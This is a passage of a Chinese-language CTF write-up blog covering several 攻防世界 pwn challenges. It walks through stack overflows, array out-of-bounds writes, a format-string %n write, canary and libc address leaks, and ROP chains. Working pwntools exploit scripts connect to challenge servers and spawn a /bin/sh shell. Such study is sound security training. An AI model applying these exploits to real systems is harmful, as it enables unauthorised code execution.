class="hljs-number">0x88</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(catflag)<br>io.send(payload)<br><span class="hljs-built_in">print</span> io.recvall()<br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-dice_game"><a class="markdownIt-Anchor" href="#攻防世界-pwn-dice_game"></a> 攻防世界 pwn-dice_game</h1>
+<p>1.先检查程序有没有存在栈溢出</p>
+<p>​        <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104229973.png" srcset="/img/loading.gif" lazyload alt="image-20210413104229973"></p>
+<p>发现不存在canary保护，可能进行栈溢出的操作。</p>
+<p>2.使用ida进行分析</p>
+<p>主函数：</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104245282.png" srcset="/img/loading.gif" lazyload alt="image-20210413104245282"></p>
+<p>sub_A20()函数</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104308863.png" srcset="/img/loading.gif" lazyload alt="image-20210413104308863"></p>
+<p>经过分析可知，该程序的目的是对比输入的数字与随机生成的种子seed[]生成的随机数对6求余再加1进行对比，如果正确50次则通过。</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104331604.png" srcset="/img/loading.gif" lazyload alt="image-20210413104331604"></p>
+<p>通过查看地址可以知道当输入名字buf时，可以通过偏移覆盖到seed，偏移量为0x40</p>
+<p>注：关于rand()和srand()随机函数:这两个函数生成的随机数实际上是一段数字的循环，这些数字取决于随机种子。在调用rand（）函数时，必须先利用srand()设好的随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</p>
+<p>所以只要控制随机数生成的种子seed，就可以预测生成的随机数，需要利用题目提供的库libc.so.6</p>
+<p>Payload脚本</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/C:%5CUsers%5C17473%5CDesktop%5C%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C%5Cmakedown%5Cimage-20210413104657091.png" srcset="/img/loading.gif" lazyload alt="image-20210413104657091"></p>
+<h1 id="攻防世界-pwn-stack2"><a class="markdownIt-Anchor" href="#攻防世界-pwn-stack2"></a> 攻防世界 pwn-stack2</h1>
+<p>1.先检查程序的保护</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105116926.png" srcset="/img/loading.gif" lazyload alt="image-20210413105116926"></p>
+<p>发现程序没有开启地址随机化，但是开启了canary保护</p>
+<p>2.用ida观察函数，发现其中存在数组越界导致的栈溢出。</p>
+ <img src="\12.png" srcset="/img/loading.gif" lazyload alt="12" style="zoom:67%;">
+<p>其中v5,v7都是我们可输入的数值，但是在赋值给数组时没有检查数组越界而导致了栈溢出</p>
+<p>3.使用gdb进行动态调试，在存在该漏洞的函数下设置断点。</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105310409.png" srcset="/img/loading.gif" lazyload alt="image-20210413105310409" style="zoom:67%;">
+<p>设置断点为0x8048839观察函数的偏移量。</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105330148.png" srcset="/img/loading.gif" lazyload alt="image-20210413105330148" style="zoom:67%;">
+<p>函数的返回地址为0xf7e1d637</p>
+<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105439298.png" srcset="/img/loading.gif" lazyload alt="image-20210413105439298" style="zoom:67%;"> 
+<p>查看当我们更改已经数组里的数字时的栈空间</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105513866.png" srcset="/img/loading.gif" lazyload alt="image-20210413105513866" style="zoom:67%;">
+<p>经过检验和计算得到的偏移量为0x84</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/11.png" srcset="/img/loading.gif" lazyload alt="11"></p>
+<p>4.用ida查看发现存在后门函数hackhere，地址为0x0804859B</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105759309.png" srcset="/img/loading.gif" lazyload alt="image-20210413105759309" style="zoom:67%;">
+<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105829019.png" srcset="/img/loading.gif" lazyload alt="image-20210413105829019" style="zoom:67%;">
+<p>5．先写出payload脚本将函数的返回地址覆盖为hackhere的函数地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>g_local=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>hackhere = <span class="hljs-number">0x0804859b</span><br>leave_offset = <span class="hljs-number">0x84</span>    <span class="hljs-comment">#偏移量</span><br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">58555</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writebyte</span>(<span class="hljs-params">offset,value</span>):</span>    <span class="hljs-comment">#构造一个函数，方便修改栈里的地址</span><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.recvuntil(<span class="hljs-string">&quot;which number to change:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(offset))           <br>  p.recvuntil(<span class="hljs-string">&quot;new number:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(value))      <span class="hljs-comment">#利用数组越界修改栈中存放的函数返回值地址</span><br><span class="hljs-comment">##def writedword()</span><br>p.recvuntil(<span class="hljs-string">&quot;How many numbers you have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Give me your numbers&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;10&#x27;</span>)<br>writebyte(leave_offset,<span class="hljs-number">0x9b</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位，依次写入hackhere的地址</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x85</span>)<br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+<p>运行之后发现hackhere函数提供的参数并不能拿到sh</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110309852.png" srcset="/img/loading.gif" lazyload alt="image-20210413110309852"></p>
+<p>此时只能构造ROP链将system函数的参数修改为/sh</p>
+<p>首先查询system的plt表地址</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110412418.png" srcset="/img/loading.gif" lazyload alt="image-20210413110412418" style="zoom:67%;">
+<p>可以看到system的plt表地址为0x08048450</p>
+<p>然后查询参数sh的地址</p>
+<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110506599.png" srcset="/img/loading.gif" lazyload alt="image-20210413110506599" style="zoom: 80%;">
+<p>参数sh的地址为0x08048987</p>
+<p>修改payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>g_local=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>hackhere = <span class="hljs-number">0x0804859b</span><br>sh = <span class="hljs-number">0x08048987</span><br>system =<span class="hljs-number">0x08048450</span><br>leave_offset = <span class="hljs-number">0x84</span>    <span class="hljs-comment">#偏移量</span><br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">59553</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writebyte</span>(<span class="hljs-params">offset,value</span>):</span>    <span class="hljs-comment">#构造一个函数，方便修改栈里的地址</span><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.recvuntil(<span class="hljs-string">&quot;which number to change:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(offset))           <br>  p.recvuntil(<span class="hljs-string">&quot;new number:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(value))      <span class="hljs-comment">#利用数组越界修改栈中存放的函数返回值地址</span><br><br>p.recvuntil(<span class="hljs-string">&quot;How many numbers you have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Give me your numbers&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;10&#x27;</span>)<br>writebyte(leave_offset,<span class="hljs-number">0x50</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x84</span>)       <span class="hljs-comment">#先写入system的plt表地址</span><br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>leave_offset+=<span class="hljs-number">8</span>                        <span class="hljs-comment">#跳过ebp</span><br>writebyte(leave_offset,<span class="hljs-number">0x87</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x89</span>)       <span class="hljs-comment">#写入参数sh</span><br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-string-格式化字符串"><a class="markdownIt-Anchor" href="#攻防世界-pwn-string-格式化字符串"></a> 攻防世界-pwn-string-格式化字符串</h1>
+<p>1.首先检查程序保护，发现保护除了PIE都开启了</p>
+<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113058130.png" srcset="/img/loading.gif" lazyload alt="image-20210413113058130" style="zoom:67%;">                               
+<p>2.用ida打开并分析函数</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113119231.png" srcset="/img/loading.gif" lazyload alt="image-20210413113119231" style="zoom:67%;">
+<p>主函数首先会打印出v4存储的值以及v4+4然后执行sub_400D72(v4)</p>
+<p>下面是sub_400D72(v4)</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113159566.png" srcset="/img/loading.gif" lazyload alt="image-20210413113159566" style="zoom:67%;">
+<p>先执行的是sub_400A7D()下图是sub_400A7D()，只能知道当显示So, where you will go?:时我们得输入east才能继续执行下去</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113242197.png" srcset="/img/loading.gif" lazyload alt="image-20210413113242197" style="zoom:67%;">
+<p>再继续观察，发现sub_400CA6(a1)这个函数里有这样一段，如果a1数组的第一个数等于第二个数，那么可以执行外部命令（查找发现这个函数是可以执行shellcode的），传过来的a1数组就是开始的v3数组</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113307543.png" srcset="/img/loading.gif" lazyload alt="image-20210413113307543" style="zoom:67%;">
+<p>然后在sub_400BB9()存在一处格式化字符串漏洞，由之前主函数可以知道v3的第一个数是68，v3[1]是85，要用格式化字符串漏洞让这两个数相等</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113331447.png" srcset="/img/loading.gif" lazyload alt="image-20210413113331447" style="zoom:67%;">
+<p>在And, you wish is:输入1，Your wish is输入aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x查看输出，可以知道之前输入的1在第七个位置是格式化字符串的第七个参数</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113404697.png" srcset="/img/loading.gif" lazyload alt="image-20210413113404697" style="zoom:67%;">
+<p>由于之前输出的secret[0]就是v3第一个数的地址，所以只要用格式化字符串漏洞修改其为85即可，然后输入shellcode（可以使用pwn库的函数自动生成）</p>
+<p>所以可以构造payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;48916&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;secret[0] is &#x27;</span>)<br>v3_addr=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">7</span>),<span class="hljs-number">16</span>) <span class="hljs-comment">#接收v3的地址</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;What should your character&#x27;s name be:\n&quot;</span>,<span class="hljs-string">&quot;abab&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;So, where you will go?east or up?:\n&quot;</span>,<span class="hljs-string">&quot;east&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;go into there(1), or leave(0)?:\n&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;\&#x27;Give me an address\&#x27;\n&quot;</span>,<span class="hljs-built_in">str</span>(v3_addr)) <span class="hljs-comment">#第一次发送v3的地址</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">85</span>+<span class="hljs-string">&#x27;%7$n&#x27;</span>   <span class="hljs-comment">#偏移为7，将v3的地址的位置的参数改为85</span><br>p.recvuntil(<span class="hljs-string">&#x27;And, you wish is:/n&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;I will help you! USE YOU SPELL\n&#x27;</span>)<br>p.sendline(asm(shellcraft.amd64.linux.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>))  <span class="hljs-comment">#发送调用/bin/sh的sellcode</span><br>p.interactive()	<br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-pwn1-构造rop链泄露put的真实地址"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn1-构造rop链泄露put的真实地址"></a> 攻防世界-pwn-pwn1-构造rop链泄露put的真实地址</h1>
+<ol>
+<li>先检查文件属性</li>
+</ol>
+<p>​    <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113958358.png" srcset="/img/loading.gif" lazyload alt="image-20210413113958358" style="zoom:67%;"></p>
+<p>该程序是64位程序，发现保护已经开的很全了</p>
+<p>2.用ida观察主函数，发现有个read函数和puts函数可以进行栈溢出</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114030279.png" srcset="/img/loading.gif" lazyload alt="image-20210413114030279" style="zoom:67%;">
+<p>3.观察栈结构，字符串s距离canary的值的偏移为0x90-0x8=0x88</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114130145.png" srcset="/img/loading.gif" lazyload alt="image-20210413114130145"></p>
+<p>所以可以通过put函数将canary显示出来，由于put函数遇到\00会停止输出，调试可以知道，当我们输入a*0x88后再输入回车时，回车的\0A会覆盖掉canary末尾的\00这时就可以输出canary</p>
+<p>输入a*0x88不输入\n时的内存数据</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114203956.png" srcset="/img/loading.gif" lazyload alt="image-20210413114203956" style="zoom:67%;">
+<p>Canary的值应该是0x7c5ddb9e9a8a7d00，但是继续运行程序选择“2“调用put函数时不输出canary的值。</p>
+<p>输入’0x88’*a+’\n’的内存空间</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114238047.png" srcset="/img/loading.gif" lazyload alt="image-20210413114238047" style="zoom:67%;">
+<p>这时可以正常输出canary的值了，但是末尾的\00会变成\0a，所以接受时要把末尾的\0a修改为\00</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114309571.png" srcset="/img/loading.gif" lazyload alt="image-20210413114309571"></p>
+<p>4.题目给了一个动态链接库，所以我们可以在里面寻找到execve(&quot;/bin/sh&quot;)的地址</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114328650.png" srcset="/img/loading.gif" lazyload alt="image-20210413114328650" style="zoom:67%;">
+<p>随便选择一个0x45216，此题开启了地址随机化，如果想要通过栈溢出运行execve(&quot;/bin/sh&quot;)，就得泄露内存中的基址</p>
+<p>5.利用put()函数泄露put()的真实地址，由于是64位程序，首先找到一个pop_rdi,查找可知地址为0x400a93</p>
+ <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114404796.png" srcset="/img/loading.gif" lazyload alt="image-20210413114404796" style="zoom:67%;">
+<p>64位程序泄露put()真实地址的方式为：p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)，泄露之后就可以使用</p>
+<p>由此可以编写payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br> <br>elf = ELF(<span class="hljs-string">&quot;./babystack&quot;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41209&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./babystack&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>execve = <span class="hljs-number">0x45216</span><br>main_addr = <span class="hljs-number">0x400908</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]           <span class="hljs-comment">#获取put的got表地址</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]           <span class="hljs-comment">#获取put的plt表地址</span><br>pop_rdi = <span class="hljs-number">0x0400a93</span><br> <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendline(payload)                  <span class="hljs-comment">#先输入0x88个a使put()能够泄露出canary的值</span><br> <br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;\n&#x27;</span>)<br> <br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))   <span class="hljs-comment">#因为末尾的\n会覆盖末尾的\00</span><br> <br>payload1 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br> <br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.send(payload1)             <span class="hljs-comment">#泄露出put()的真实地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>puts_addr=u64(p.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))  <span class="hljs-comment">#读取到\x00停止</span><br><br>execve_addr = puts_addr - (libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>] - execve)   <span class="hljs-comment">#使用相对偏移来计算execve的真实地址</span><br><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> +  p64(execve_addr)  <span class="hljs-comment">#覆盖返回值为execve的真实地址</span><br>p.sendlineafter(<span 